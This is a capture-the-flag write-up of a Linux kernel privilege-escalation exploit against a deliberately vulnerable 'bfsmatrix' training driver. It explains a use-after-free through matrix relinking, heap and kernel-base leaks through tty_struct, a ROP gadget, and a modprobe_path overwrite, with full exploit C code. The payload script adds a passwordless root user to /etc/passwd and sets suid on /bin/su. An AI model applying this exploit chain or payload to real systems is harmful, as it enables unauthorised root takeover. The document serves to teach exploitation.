[Orignal](https://static.bluefrostsecurity.de/files/lab/bfsmatrix_offensivecon2023.tgz)

```c
struct matrix
{
  int rows;                 // number of rows in the matrix
  int cols;                 // number of columns in the matrix
  uint8_t* data;            // 1-d backing data (rows x cols size)
  char name[MAX_MATRIX_NAME]; // name of the matrix
  struct matrix* link;      // linked peer
  struct task_struct* task; // owner of the object
  spinlock_t lock;          // fine grained locking
};
...
static int bfs_matrix_pos(
  struct matrix* matrix,
  struct matrix_pos __user* upos,
  int write)
{
  uint8_t* byte = NULL;
  struct matrix* target = NULL;

  struct matrix_pos kpos = {0};
  if (copy_from_user(&kpos, upos, sizeof(struct matrix_pos)))
    return -EFAULT;

  spin_lock(&matrix->lock);

  // if write mode, then we use the link
  if (write)
  {
    if (matrix->link)
    {
      target = matrix->link;
      spin_lock(&target->lock);
    }

    spin_unlock(&matrix->lock);
  }
  else
  {
    target = matrix;
  }
...
static int matrix_do_link(struct matrix* matrix, int ufd)
{
  int error = -EINVAL;

  struct matrix* link = NULL;

  // grab a reference to the file
  struct fd f = fdget(ufd);
  if (! f.file)
    return -EBADF;

  // check that the actual description belongs to a matrix
  link = f.file->private_data;
  if (f.file->f_op != &matrix_fops)
    goto err;

  if (matrix == link)
    goto err;

  if (matrix < link)
  {
    spin_lock(&matrix->lock);
    spin_lock(&link->lock);
  }
  else
  {
    spin_lock(&link->lock);
    spin_lock(&matrix->lock);
  }

  // make a new link
  matrix->link = link;
  link->link = matrix;

  spin_unlock(&matrix->lock);
  spin_unlock(&link->lock);

  error = 0;

err:
  fdput(f);

  return error;
}
```

The `matrix_do_link` function allows us to link a matrix to another. The `bfs_matrix_pos` function only lets us read the data of the matrix itself and overwrite the data of its link rather than itself.
But what if we close the file that contains the linked matrix? Let's check the release function:

```c
static int matrix_release(struct inode* inode, struct file* file)
{
  struct matrix* matrix = file->private_data;

  spin_lock(&matrix->lock);

  // unlink from pair
  if (matrix->link)
    matrix->link->link = NULL;

  // release data
  if (matrix->data)
    kfree(matrix->data);

  spin_unlock(&matrix->lock);

  // release the matrix
  kfree(matrix);

  return 0;
}
```

So the `matrix_release` function unlinks 2 two matrixes before calling `kfree`, so we can't trigger the UAF bug now.

But what if I unlink 2 matrixes before deleting one of them?

So, here is my strategy:

+ Link matrix1 <-> matrix2
+ Link matrix2 <-> matrix3, now `matrix2->link = matrix3` and `matrix3->link = matrix2` but still have `matrix1->link = matrix2`
+ So, now if I delete `matrix2`, I can still overwite its old data via `matrix1` -> the UAF bug.

```c
    int fd1 = openDEV(); 
    int fd2 = openDEV();
    //Linking
    if(do_link(fd1,fd2) < 0)
        errExit("Do_link");
    logInfo("Link fd1 <-> fd2: done.");

    int fd3 = openDEV();
    if(do_link(fd2,fd3) < 0)
        errExit("do_link");
    
    logInfo("Link fd2 <-> fd3: done. But fd1 -> fd2 ?");
    close(fd2);
    logInfo("Closed fd2");
```

But we still need leak heap address and kernel base address.

The function `matrix_set_info` allows us to set any size for the matrix via `matrix->data = kmalloc(matrix->rows * matrix->cols, GFP_KERNEL);`

So I will take advantage of [`struct tty_struct`](https://elixir.bootlin.com/linux/v6.0.15/source/include/linux/tty.h#L195) to leak:
![image](https://github.com/robbert1978/kernel_for_fun/assets/31349426/5d2a9eb2-30b5-4b6c-9faf-8a47e3570d8e)
![image](https://github.com/robbert1978/kernel_for_fun/assets/31349426/e20edd81-de55-4309-b39a-4d752c674890)

We can leak kernel base address via offset 0x18 and heap address via offset 0x38.

```c
int set_info(int devfd, struct matrix_info* info){
    return ioctl(devfd,IOCTL_MATRIX_SET_INFO,info);
}
int do_link(int devfd1, int devfd2){
    return ioctl(devfd1,IOCTL_MATRIX_DO_LINK,devfd2);
}
int setname(int devfd,char* name){
    return ioctl(devfd,IOCTL_MATRIX_SET_NAME,name);
}

void readMARIX64(int devfd, uint64_t* need, off64_t offset){
    struct matrix_pos leaker = {0};
    leaker.col = 0;
    for(uint32_t i = 0 ; i < 8;  ++i ){
        leaker.row = offset+i;
        ioctl(devfd,IOCTL_MATRIX_GET_POS,&leaker);
        ((char *)need)[i] = leaker.byte;
    }
}

void writeMATRIX64(int devfd, uint64_t* todo, off64_t offset){
    struct matrix_pos write_pos = {0};
    write_pos.col = 0;
    for(uint32_t i = 0 ; i < 8 ; ++i){
        write_pos.row = offset+i;
        write_pos.byte = ((char *)todo)[i];
        ioctl(devfd,IOCTL_MATRIX_SET_POS,&write_pos);
    }
}

int main(int argc,char** argv,char** envp){
    int fd1 = openDEV();
    int ptmx_fd = open("/dev/ptmx",O_RDWR);
    uint64_t chunk_addr1 = 0;
    if(ptmx_fd < 0)
        errExit("Open ptmx");
    struct matrix_info info1={
        .rows = 0x2e0,
        .cols = 1
    };
    close(ptmx_fd);
    if(set_info(fd1,&info1) < 0 )
        errExit("Set info fd1");
    logInfo("Set fd1 info: done.");
    //Leaking
    readMARIX64(fd1,&chunk_addr1,0x38);
    chunk_addr1 -= 0x38;
    logInfo("Chunk1 @ %p",(void *)chunk_addr1);


    int fd2 = openDEV();
    ptmx_fd = open("/dev/ptmx",O_RDWR);
    if(ptmx_fd < 0)
        errExit("Open ptmx");
    struct matrix_info info2={
        .rows = 0x2e0,
        .cols = 1
    };
    close(ptmx_fd);
    if(set_info(fd2,&info2) < 0)
        errExit("Set info fd2");
    logInfo("Set fd2 info: done.");
    
    //Linking
    if(do_link(fd1,fd2) < 0)
        errExit("Do_link");
    logInfo("Link fd1 <-> fd2: done.");

    //Leaking
    uint64_t ptm_unix98_ops = 0;
    uint64_t chunk_addr2 = 0;
    readMARIX64(fd2,&ptm_unix98_ops,0x18);
    readMARIX64(fd2,&chunk_addr2,0x38);
    chunk_addr2 -= 0x38;
    logInfo("ptm_unix98_ops = %p",(void *)ptm_unix98_ops);
    logInfo("Chunk2 @ %p",(void *)chunk_addr2);

    int fd3 = openDEV();

    if(do_link(fd2,fd3) < 0)
        errExit("do_link");
    
    logInfo("Link fd2 <-> fd3: done. But fd1 -> fd2 ?");
    close(fd2);
    logInfo("Closed fd2");

    struct matrix_info info3={
        .rows = sizeof(struct matrix),
        .cols = 1
    };
    
    if(set_info(fd3,&info3))
        errExit("set_info 3");
    logInfo("Allocate matrix3->data dup matrix2");
```

In the `matrix_open`, we know that the matrix is also allocated via `kzalloc` : 
```c
static int matrix_open(struct inode* inode, struct file* file)
{
  struct matrix* matrix = NULL;

  // alloc a new matrix
  file->private_data = kzalloc(sizeof(struct matrix), GFP_KERNEL);
  if (! file->private_data)
    return -ENOMEM;

  matrix = file->private_data;
```

So I will allocate 64 bytes (size of `struct matrix`) for  `matrix3->data` , `matrix3->data` will overlap with `matrix2`.

Also, creating and linking `matrix4` to `matrix3` to write data to `matrix3->data`.

```c
struct matrix_info info3={
        .rows = sizeof(struct matrix),
        .cols = 1
    };
    
    if(set_info(fd3,&info3))
        errExit("set_info 3");
    logInfo("Allocate matrix3->data dup matrix2");

    int fd4 = openDEV();
    if(do_link(fd3,fd4))
        errExit("do_link");
    logInfo("Link fd4 <-> fd3");

    uint32_t rowcol[2] = {0x100,0x100};
    writeMATRIX64(fd4,(uint64_t *)rowcol,0);
    logInfo("write 0x100 0x100 to old matrix2{rows,cols}");
```
I will set size of `matrix2` is `0x100` x `0x100`.

Now allocating new `struct tty_struct`, it will overlap with `matrix2` because the latest freed 0x2e0-size chunk is `matrix2->data`.

Overwrite `.ops` of the new `struct tty_struct`, we can control RIP ( I will set `tty_struct->ops` = `matrix3->data` ).

```c
    ptmx_fd = open("/dev/ptmx",O_RDWR);
    if(ptmx_fd < 0)
        errExit("Open ptmx");
    logInfo("pmtx = matrix2->data");


    //Preparing payload
    int _ = open("/dev/ptmx",O_RDWR);
    if(_ < 0)
        errExit("open ptmx");
    info3.rows = 0x2e0;
    close(_);
    if(set_info(fd3,&info3))
        errExit("set_info 3");
    uint64_t chunk_addr3 = 0;
    readMARIX64(fd3,&chunk_addr3,0x38);
    chunk_addr3 -= 0x38;
    logInfo("Chunk3 @ %p",(void *)chunk_addr3);
    uint64_t _text = ptm_unix98_ops - 0x82fb40;
    uint64_t modprobe_path = _text + 0xa51ba0;
    
    //rop
    uint64_t rop = _text+0x2dd74f; // xor eax,eax ; mov qword ptr [rdx], rcx ; ret
    writeMATRIX64(fd4,&rop,offsetof(struct tty_operations,ioctl));
    writeMATRIX64(fd1,&chunk_addr3,0x18);
```

By using `ROPgadget`, I see a useful gadget ( I don't know why `ROPgadget` is different from `gdb` :) ) :  

![image](https://github.com/robbert1978/kernel_for_fun/assets/31349426/be511d1a-e063-4765-86ad-cef2421a5de3)
![image](https://github.com/robbert1978/kernel_for_fun/assets/31349426/1c4b6148-404b-4097-b33e-19b44614fc54)
![image](https://github.com/robbert1978/kernel_for_fun/assets/31349426/64fc36c1-15c5-4cc1-a5db-391c1fbcadcf)

So, i will set `tty_struct->ops->ioctl` = `0xffffffff811571d9`.

Finally, using that gadget to overwrite `modprobe_path` to `/home/user/vjp` and get root shell :) :

```c
    uint64_t _text = ptm_unix98_ops - 0x82fb40;
    uint64_t modprobe_path = _text + 0xa51ba0;
    
    //rop
    uint64_t rop = _text+0x2dd74f; // xor eax,eax ; mov qword ptr [rdx], rcx ; ret
    writeMATRIX64(fd4,&rop,offsetof(struct tty_operations,ioctl));
    writeMATRIX64(fd1,&chunk_addr3,0x18);

    //Change /sbin/modprobe to /home/user/vjp
    char* inject = "/home/user/vjp";
    for(uint64_t i = 0 ; i < strlen(inject)/4+1; ++i){
        ioctl(ptmx_fd,*(uint32_t *)(inject+4*i),modprobe_path+4*i);
    }

    int vjpfd = open("/home/user/vjp",O_CREAT | O_RDWR);
    if(vjpfd < 0)
        errExit("open /home/user/vjp");
    dprintf(vjpfd,
        "#!/bin/sh\n"
        "echo 'vjp::0:0:root:/:/bin/sh' >> /etc/passwd\n"
        "/bin/chmod +s /bin/su"
    );
    close(vjpfd);
    if(chmod("/home/user/vjp",0777))
        errExit("chmod");

    //Trigger call call_modprobe
    int magic = open("/home/user/pwn",O_CREAT | O_RDWR);
    if(magic < 0)
        errExit("open /home/user/pwn");
    dprintf(magic,"\x13\x37\x42\x42");
    close(magic);
    if(chmod("/home/user/pwn",0777))
        errExit("chmod");

    //Root
    system("/home/user/pwn");
    system("cat /etc/passwd");
    system("su vjp");
    }
```
![image](https://github.com/robbert1978/kernel_for_fun/assets/31349426/536b1450-eca2-408a-8631-fd5610fe2c41)



